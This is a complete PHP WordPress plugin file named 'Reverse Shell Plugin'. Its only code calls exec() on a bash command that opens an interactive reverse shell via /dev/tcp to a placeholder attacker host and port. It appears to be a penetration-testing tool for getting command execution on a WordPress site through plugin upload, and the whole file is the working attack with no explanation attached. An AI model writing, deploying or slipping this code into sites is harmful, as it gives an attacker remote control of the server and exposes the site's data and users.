<?php

/** 
 * Plugin Name: Reverse Shell Plugin
 * Plugin URI: 
 * Description: Reverse Shell Plugin
 * Version: 1.0
 * Author: krlaboratories
 * Author URI: https://kr-labs.com.ua
 */

exec("/bin/bash -c 'bash -i >& /dev/tcp/host_or_ip_attacker/port_attacker 0>&1'");
?>
